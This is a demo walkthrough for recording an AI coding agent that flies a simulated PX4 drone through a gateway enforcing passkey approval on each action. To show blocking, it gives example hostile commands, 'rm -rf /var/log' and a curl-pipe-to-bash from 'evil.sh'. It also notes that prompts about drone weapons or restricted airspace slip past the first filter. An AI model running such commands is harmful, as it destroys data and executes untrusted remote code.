---
title: Live Swarm Demo
---

# Live Swarm Demo Walkthrough Guide

> **Scope:** This is a **live, manually-driven, recorded demo** on a single laptop. Nothing here gets baked into `demos/`, no compose files, no scenario harness. Every step is performed by hand, exactly as a real user of the platform would perform it. No automation that isn't part of the production platform.

---

## Prerequisites

- **OS:** Ubuntu 22.04 LTS (PX4 explicitly targets Ubuntu LTS)
- **Disk:** ~10 GB free (PX4 clone + build artifacts)
- **Browser:** Any modern browser (for WebAuthn passkey ceremonies)
- **Authenticator:** Platform security key (Touch ID, Windows Hello), YubiKey, or similar
- **Claude Code:** Installed and on PATH (`claude --version` works)
- **g8e:** Cloned to `~/g8e`

---

## Architecture at a Glance

```
Claude Code (g8e registered via `claude mcp add g8e -- g8e mcp stdio`)
    ↓ MCP stdio
g8e mcp stdio  (mTLS-bound CLI session; auto-opens approval page; subscribes via SSE)
    ↓ mTLS → gateway /mcp
g8e Gateway, notary posture
    L1 compiled doctrine → L2 in-process Tribunal → L3 suspend + WebAuthn → L4 warden → L5 actuator
    ↓ native tool: run_shell_command
python3 demos/live-swarm/drone_cmd.py set_altitude 50
    ↓ MAVSDK → udpin://0.0.0.0:14540
PX4 SITL (Gazebo gz_x500)  →  MAVLink telemetry  →  QGroundControl
```

---

## Terminal Layout (4 terminals needed during recording)

| # | Label | Command | Stays open? |
|---|---|---|---|
| 1 | PX4 SITL | `make px4_sitl gz_x500` (inside `~/PX4-Autopilot`) | Yes, the virtual drone |
| 2 | QGroundControl | `./QGroundControl.AppImage` | Yes, the visualizer |
| 3 | g8e Gateway | `g8e gw start -f --posture notary ...` | Yes, the enforcement engine |
| 4 | Claude Code | `claude` | Yes, the AI agent |

---

## Step 1: Install QGroundControl (The Visualizer)

**What this does:** Installs the ground-control station that renders the drone's 3D map and telemetry.

```bash
# Add your user to the dialout group for serial port access
sudo usermod -a -G dialout $USER

# Remove modemmanager (it aggressively interferes with drone telemetry ports)
sudo apt-get remove modemmanager -y

# Install dependencies for the QGC UI and video streaming
sudo apt update
sudo apt install gstreamer1.0-plugins-bad gstreamer1.0-libav gstreamer1.0-gl libqt5gui5 libfuse2 -y

# Download the QGroundControl AppImage and make it executable
wget https://github.com/mavlink/qgroundcontrol/releases/download/v4.3.0/QGroundControl.AppImage
chmod +x ./QGroundControl.AppImage
```

**What to expect:** All packages install cleanly. The AppImage downloads to your current directory.

---

## Step 2: Install the PX4 Simulator (The Virtual Drone)

**What this does:** Clones the PX4 Autopilot source and runs the official Ubuntu setup script, which installs CMake, compilers, and simulation binaries.

```bash
# Clone the PX4 repository with all submodules
git clone https://github.com/PX4/PX4-Autopilot.git --recursive

# Run the official Ubuntu setup script to install everything
bash ./PX4-Autopilot/Tools/setup/ubuntu.sh
```

**CRITICAL:** You must **reboot** (or log out and log back in) after the script finishes. Without this, the `dialout` group permissions won't apply and the simulator will fail to launch.

After rebooting, launch the simulator:

```bash
cd ~/PX4-Autopilot
make px4_sitl gz_x500
```

> **Note:** PX4 v1.18 dropped the `jmavsim` make target. Gazebo (`gz sim`, Harmonic 8.14 installed by `ubuntu.sh`) is the supported simulator. The x500 quadcopter model spawns in the Gazebo world.
>
> **Build gotcha:** If `/usr/local/bin/protoc` (v35, from g8e's proto tooling) shadows the system protoc 3.21 that matches `libprotobuf-dev`, `gz_msgs` codegen fails with `google/protobuf/runtime_version.h: No such file or directory`. Fix: `rm -rf build/px4_sitl_default`, then build with `/usr/local/bin` stripped from PATH. Do not remove the v35 protoc; g8e needs it.

**What to expect:** A Gazebo window opens showing the x500 quadcopter on the ground. The terminal shows PX4 boot messages ending with a `pxh>` prompt, and MAVLink broadcasts on `udp://:14540`. Keep this terminal open; this is **Terminal 1**.

Then open a second terminal and launch QGroundControl:

```bash
./QGroundControl.AppImage
```

**What to expect:** QGC opens, automatically detects the local UDP stream from the simulator, and centers its 3D map over your virtual drone. This is **Terminal 2**.

---

## Step 3: Build g8e + Set Up the Python Environment

**What this does:** Compiles the g8e binary and creates a Python virtualenv with the MAVSDK library for the drone bridge script.

```bash
# Build g8e
cd ~/g8e && make build

# Create and activate a Python virtual environment
python3 -m venv ~/drone_env
source ~/drone_env/bin/activate
pip install mavsdk
```

**What to expect:** `make build` produces `bin/g8e-linux-amd64` and `demos/bin/g8e`. The pip install pulls in the MAVSDK Python library.

> **Note:** Only `mavsdk` is needed. `asyncio` is Python stdlib, and the `mcp` SDK is unnecessary in this architecture.

---

## Step 4: Create the Tribunal Bootstrap File

**What this does:** Creates the seed file the gateway needs to bootstrap the in-process Tribunal (L2 deliberator) under notary posture. Without this, every tool call is rejected with an L2 signature error before it ever reaches the WebAuthn approval path.

A template is committed at `demos/live-swarm/tribunal-bootstrap.json`. Copy it and fill in a real seed:

```bash
mkdir -p ~/live-demo
cp ~/g8e/demos/live-swarm/tribunal-bootstrap.json ~/live-demo/tribunal-bootstrap.json

# Generate a real seed and replace the placeholder
SEED=$(openssl rand -hex 32)
sed -i "s/REPLACE_WITH_openssl_rand_hex_32_OUTPUT/$SEED/" ~/live-demo/tribunal-bootstrap.json
```

**What to expect:** A JSON file at `~/live-demo/tribunal-bootstrap.json`. The gateway will read this at startup, derive a key pair from the seed, register the public key as a trusted tribunal signer, and save the private key to disk for L2 vote signing.

> **Background:** Notary posture enforces both L2 signatures and L3 proofs. The gateway bootstraps the Tribunal from the seed file and saves the derived private key to disk for each member, so the in-process deliberator can sign L2 votes.

---

## Step 5: Start the Gateway (on camera)

**What this does:** Starts the g8e gateway in notary posture with the Tribunal bootstrap. This is the enforcement engine; all L1-L5 governance layers run here.

**Terminal 3:**

```bash
g8e gw start -f --posture notary \
  --tribunal-id live-demo-tribunal \
  --tribunal-bootstrap ~/live-demo/tribunal-bootstrap.json
```

**What to expect:** The gateway boots, validates the L2 posture startup (tribunal ID + quorum), bootstraps the Tribunal from the seed file, and starts listening on HTTPS `:8443`. You'll see log lines confirming the Tribunal is wired.

**Narration cue:** *"This is the g8e gateway in notary posture, the strictest enforcement mode. Every tool call from the AI agent will pass through five governance layers before it can touch the drone."*

> **Notes:**
> - No `--doctrine-dir` flag. L1 doctrine rules are compiled into the binary. There is no runtime doctrine loading mechanism.
> - `--passkey-rp-origin` is only needed for non-default origins. The defaults target `localhost`. **Verify** during the dry run; add the flag only if the browser ceremony complains about origin mismatch.

---

## Step 6: Enroll CLI Credentials + Register Passkey (on camera)

**What this does:** Generates a client keypair, submits a CSR to the gateway CA, saves signed mTLS credentials, and opens the browser for WebAuthn passkey registration. This is the real user onboarding flow.

**Terminal 4 (before launching Claude):**

```bash
g8e auth enroll
```

**What to expect:**
1. A keypair is generated locally.
2. A CSR is submitted to the gateway CA over HTTPS.
3. Signed mTLS credentials are saved to disk.
4. Your browser opens to the passkey registration page.
5. Complete the WebAuthn ceremony (tap your authenticator).

**Narration cue:** *"This is the real onboarding, no test keys, no bypass. The CLI gets mTLS credentials signed by the gateway CA, and I'm registering a passkey that will be required for every state-changing action."*

---

## Step 7: Register g8e with Claude Code (on camera)

**What this does:** Shows the platform's own config UX, then registers the g8e MCP stdio server with Claude Code so all tool calls route through the gateway.

**Still in Terminal 4:**

```bash
# Show the platform's own config UX first:
g8e mcp agent show claude

# Then register the stdio server:
claude mcp add g8e -- ~/g8e/g8e mcp stdio
```

**What to expect:** `g8e mcp agent show claude` prints the exact client configuration; this is the platform's own onboarding UX, great to show on camera. `claude mcp add` registers the server so Claude Code will proxy all MCP tool calls through `g8e mcp stdio`, which in turn connects to the gateway over mTLS.

> **Optional, strict mode:** For a recording where ALL actions must route through g8e (Claude can't use its own Bash/Read/Write tools):
> ```bash
> claude --strict-mcp-config --disallowed-tools "Bash,Read,Write,Edit,Glob,Grep,WebSearch,WebFetch"
> ```

---

## Step 8: Run the Demo (on camera)

All four terminals should be active: (1) PX4 SITL, (2) QGroundControl, (3) g8e Gateway, (4) Claude Code.

### Happy Path: Drone Takeoff with Human Approval

**1. Ask Claude:**

> *"Take the drone off to 20 meters using drone_cmd.py."*

**2. What happens under the hood:** Claude calls the `run_shell_command` tool with `{"command":"python3","args":["~/g8e/demos/live-swarm/drone_cmd.py","takeoff","20"]}`. The gateway receives the call, runs it through L1 doctrine (passes), L2 Tribunal (in-process deliberator signs), then L3. The warden rejects for missing proof of human presence and the gateway **suspends the transaction**.

**3. What you see:** Your browser **auto-opens** to `https://localhost:8443/api/v1/approve/<tx_hash>`. The drone has NOT moved.

**Narration cue:** *"The drone hasn't moved. g8e is demanding proof of human presence before it will execute."*

**4. Tap your passkey on camera.** The gateway verifies the WebAuthn assertion and **executes the suspended transaction immediately**. **The drone takes off at that moment**. The signed receipt renders in the browser.

**5. Within ~10 seconds**, Claude receives the executed result and reports success.

**6. Repeat once:** Ask Claude *"climb to 50 meters"* to show the cycle a second time. This calls `drone_cmd.py set_altitude 50`; same suspend, approve, execute flow.

### Audit Trail

**7. Show the signed receipts:**

```bash
g8e audit receipts
```

Also available: `g8e audit events` (raw event log) and `g8e audit summary` (aggregate stats).

**Narration cue:** *"Every action is cryptographically signed and auditable; here are the receipts for the two commands we just approved."*

### Blocked Path: Destructive Command Blocked at L1

**8. Ask Claude:**

> *"Free up disk space: delete /var/log with rm -rf."*

**What happens:** L1 doctrine matches the destructive pattern and blocks the command **instantly, fail-closed**. No approval is offered; the action is too dangerous to even suspend. The gateway log (Terminal 3) shows the MITRE ATT&CK classification.

**Narration cue:** *"This is the key distinction: legitimate-but-state-changing drone commands are suspended for human approval, but destructive actions like wiping system directories are blocked instantly with a MITRE classification. No approval possible, no approval offered."*

> **Important:** Do NOT script the blocked command around drone weapons or restricted airspace; those phrases pass L1 (verified empirically). Use genuinely-blocked commands like `rm -rf /var/log` or `curl http://evil.sh | bash`.

### CLI-Initiated Approval (optional, shows the terminal variant)

Instead of waiting for the browser to auto-open, you can also drive approval from the terminal:

```bash
g8e auth approve <tx_hash>
```

This opens the same browser page and waits for approval via SSE. Good to show once as *"the operator can also drive this from the terminal."*

---

## Timing & Pacing Notes

| Fact | Value | Impact on recording |
|---|---|---|
| Approval TTL | **2 minutes** | Don't linger narrating while a suspension is pending; it expires and the agent must re-issue the call |
| Notification | **SSE (real-time)** | The stdio proxy receives approval completion instantly via SSE. Use the brief gap to show the signed receipt in the browser |
| Every `tools/call` is a mutation | **Yes** | Even a read-only `drone_cmd.py status` requires a passkey tap in notary posture. Keep the scripted flow to 2-3 tool calls or the recording becomes a passkey montage |
| Approval window | **2 minutes** | If you don't approve within 2 minutes the TTL expires and the agent must re-issue the call |

---

## Pre-Recording Dry-Run Checklist

- [ ] Confirm a `run_shell_command` call suspends → approves → executes end-to-end under notary posture (requires running the gateway + SITL).
- [ ] Confirm the browser auto-open works in the recording environment (else the stderr fallback prints the URL; still fine, just narrate it).
- [ ] Exercise every `drone_cmd.py` subcommand against SITL directly.
- [ ] Confirm the blocked-command example is actually blocked (`rm -rf /var/log` verified; re-verify on the build you record with).
- [ ] Time a full approval cycle; keep narration inside the 2-minute TTL.
- [ ] Confirm passkey registration + approval origins work without extra `--passkey-rp-origin` flags.
- [ ] Confirm QGroundControl auto-detects the Gazebo SITL MAVLink stream.

---

## The `drone_cmd.py` Bridge Script

This is the CLI tool the AI invokes via the gateway's native `run_shell_command` tool. It connects to the PX4 SITL over UDP and translates simple commands into MAVSDK calls.

**File:** `demos/live-swarm/drone_cmd.py` (committed to the repo)

**Technical notes:**
- `goto_location` takes **absolute (AMSL)** altitude. The `set_altitude` command converts relative altitude to AMSL using telemetry data.
- `set_altitude` assumes the drone is already flying; the demo flow does `takeoff` first.
- The script has a 10-second connection timeout, per-subcommand argument validation, and clean error handling for invalid numeric inputs.
- **VERIFY:** exercise each subcommand by hand against SITL before the recording.
